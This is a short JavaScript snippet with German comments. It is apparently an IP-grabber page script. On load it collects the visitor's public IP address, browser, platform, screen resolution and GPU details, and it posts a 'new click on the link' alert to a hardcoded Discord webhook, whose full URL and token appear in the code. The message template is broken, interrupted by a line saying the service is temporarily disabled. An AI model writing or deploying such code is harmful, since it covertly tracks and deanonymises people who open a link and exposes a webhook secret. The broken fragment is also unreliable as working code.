// IP-Adresse abrufen
fetch("https://api.ipify.org?format=json")
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;
    const webhookUrl = "https://discord.com/api/webhooks/1419580060041609309/nEogJD_MFi2WHcypOz_p93vcXH-EHGUI-F74KYaoed014rwBJnJZT0FMyaA8HRPhNJKq";
    const browser = navigator.userAgent;
    const platform = navigator.platform;
    const zeitstempel = new Date().toLocaleString("de-DE");

    // Bildschirmauflösung
    const screenResolution = `${screen.width}x${screen.height}`;

    // WebGL-Info (GPU)
    let gpuInfo = "Nicht verfügbar";
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (gl) {
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (debugInfo) {
          const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
          gpuInfo = `${vendor} | ${renderer}`;
        }
      }
    } catch (e) {
      gpuInfo = "Fehler beim Abrufen";
    }

    // Nachricht formatieren
    const payload = {
      content: `# 📨 NEUER KLICK AUF DEN LINK!
sandro hat diesen service vorüber gehend deaktiviert
    };

    // An Discord senden
    fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    }).catch(err => {
      console.error("Fehler beim Senden an Discord:", err);
    });
  })
  .catch(err => {
    console.error("Fehler beim Abrufen der IP-Adresse:", err);
  });
